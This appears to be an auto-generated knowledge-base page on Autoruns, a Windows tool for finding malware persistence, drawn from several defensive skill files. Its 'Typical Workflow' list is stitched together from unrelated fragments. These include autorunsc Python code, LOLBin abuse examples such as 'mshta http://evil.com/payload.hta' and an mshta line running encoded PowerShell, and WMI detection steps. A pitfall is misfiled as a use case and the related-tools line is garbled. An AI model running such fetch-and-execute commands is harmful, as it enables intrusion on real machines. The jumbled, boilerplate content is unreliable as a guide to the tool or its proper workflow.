# Autoruns

## Overview
Autoruns is a malware analysis tool that appears across malware analysis workflows in this knowledge base. It is referenced as part of higher-level security analysis, investigation, monitoring, or validation activity rather than as an end in itself.

## What It Is
Autoruns is best understood as a malware-analysis tool in this knowledge base. Its role is conceptual and system-facing rather than procedural: it gives analysts or defenders a structured way to examine evidence, model system behavior, or reason about security state.

## How It Works
Autoruns works by turning technical inputs into more interpretable outputs at the system level. Across the source skills, it appears as part of larger analysis, investigation, monitoring, or validation loops rather than as a standalone end state.

## Core Concepts
- autoruns
- persistence
- malware analysis
- sysinternals
- windows
- registry
- startup
- incident response
- malware
- fileless
- LOLBins
- memory analysis

## Typical Workflow
- cmd = [autorunsc_path, "-a", "*", "-c", "-h", "-s", "-nobanner", "*"]
- result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
- f.write(result.stdout)
- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Abuse: Execute HTA files with embedded VBScript/JScript
- Example: mshta http://evil.com/payload.hta
- Example: mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc ...""")
- Abuse: Load scriptlets via COM (.sct files) - "Squiblydoo"
- 1. **Collect Telemetry**: Parse Sysmon Event IDs 19 (WmiEventFilter), 20 (WmiEventConsumer), 21 (WmiEventConsumerToFilter).
- 2. **Identify Suspicious Consumers**: Flag CommandLineEventConsumer and ActiveScriptEventConsumer types executing code.

## Use Cases
- When investigating security incidents that require analyzing malware persistence with autoruns
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques
- EDR alerts indicate suspicious behavior from trusted system binaries (PowerShell, mshta, wmic, regsvr32)
- Investigating attacks that leave no traditional malware files on disk
- Analyzing WMI event subscriptions, registry-stored payloads, or scheduled task abuse for persistence
- Building detection rules for LOLBin (Living Off the Land Binary) abuse in enterprise environments
- Memory forensics reveals malicious code but no corresponding files exist on the filesystem
- Rebooting the system before capturing a memory dump (destroys in-memory evidence)

## Limitations
- Output still depends on context, data quality, and surrounding analysis.
- The tool should be interpreted as part of a broader workflow, not as a complete answer by itself.
- Capabilities and visibility vary depending on environment, integrations, and available inputs.

## Related Tools
- Sysmon, Velociraptor, Volatility, And Fileless Malware Artifacts, And Network Connections, And Process Activity For Observing Fileless Attack Behavior, And Registry Entries, Injected Processes

## Sources
- analyzing-malware-persistence-with-autoruns
- detecting-fileless-malware-techniques
- detecting-wmi-persistence
- performing-malware-persistence-investigation
